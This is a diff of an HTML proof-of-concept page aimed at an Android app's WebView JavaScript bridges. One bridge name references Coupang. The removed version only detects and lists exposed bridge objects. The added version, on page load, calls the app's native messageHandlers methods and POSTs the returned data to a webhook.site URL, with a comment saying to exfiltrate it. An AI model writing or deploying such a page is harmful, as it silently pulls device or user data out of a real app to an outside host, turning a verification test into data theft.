@@ -1,101 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vulnerability Verification PoC</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            padding: 20px;
-            background-color: #f4f6f9;
-            color: #333;
-        }
-        .card {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        h1 { color: #d9534f; font-size: 24px; }
-        .status {
-            padding: 10px;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-        .exposed { background-color: #f2dede; color: #a94442; border: 1px solid #ebccd1; }
-        .secure { background-color: #dff0d8; color: #3c763d; border: 1px solid #d6e9c6; }
-        pre { background: #222; color: #fff; padding: 15px; border-radius: 4px; overflow-x: auto; }
-    </style>
-</head>
+<html>
+<head><title>Bridge Data Audit</title></head>
 <body>
+    <script>
+        window.onload = function() {
+            let logData = {};
 
-<div class="card">
-    <h1>Security Assessment PoC</h1>
-    <p><strong>Target Context:</strong> <script>document.write(window.location.origin);</script></p>
-    <hr>
-    
-    <h3>JavaScript Interface Detection Status:</h3>
-    <div id="interface-status">Checking for injected interfaces...</div>
-
-    <h3>Environment Debug Information:</h3>
-    <pre id="debug-log">Initializing audit...</pre>
-</div>
-
-<script>
-    (function() {
-        const logElement = document.getElementById('debug-log');
-        const statusElement = document.getElementById('interface-status');
-        let logBuffer = [];
-
-        function log(message) {
-            logBuffer.push("[" + new Date().toLocaleTimeString() + "] " + message);
-            logElement.textContent = logBuffer.join("\n");
-        }
-
-        // List of interfaces identified in the manifest/decompiled code
-        const targetInterfaces = [
-            'messageHandlers',
-            'eatsPopupWebViewHandlers',
-            'eatsWebEventHandlers',
-            'eatsWebTrackingHandlers',
-            'CoupangAppTracking'
-        ];
-
-        let exposedCount = 0;
-
-        log("Starting interface presence check...");
-
-        targetInterfaces.forEach(interfaceName => {
-            if (window[interfaceName]) {
-                log("⚠️ EXPOSED: Found global object 'window." + interfaceName + "'");
-                exposedCount++;
+            if (typeof window.messageHandlers !== 'undefined') {
+                // Try executing common methods to see if they return data strings
+                try { logData.deviceStatus = window.messageHandlers.deviceStatus(); } catch(e){}
+                try { logData.toStringVal = window.messageHandlers.toString(); } catch(e){}
                 
-                // Inspect properties safely without executing functional logic
-                const properties = Object.getOwnPropertyNames(window[interfaceName]);
-                if (properties.length > 0) {
-                    log("   ↳ Available methods: " + properties.join(', '));
-                } else {
-                    log("   ↳ Methods: Native functions present (proto inspection restricted)");
-                }
-            } else {
-                log("✅ ABSENT: 'window." + interfaceName + "' is not accessible.");
+                // Exfiltrate whatever data was returned to your webhook
+                fetch('https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e/', {
+                    method: 'POST',
+                    body: JSON.stringify(logData)
+                });
             }
-        });
-
-        // Update UI summary for the triager screenshot
-        if (exposedCount > 0) {
-            statusElement.className = "status exposed";
-            statusElement.innerHTML = "⚠️ VULNERABLE: " + exposedCount + " custom Android JavaScript interface(s) detected on an external origin.";
-        } else {
-            statusElement.className = "status secure";
-            statusElement.innerHTML = "✅ SECURE: No custom JavaScript interfaces detected.";
-        }
-    })();
-</script>
-
+        };
+    </script>
 </body>
 </html>
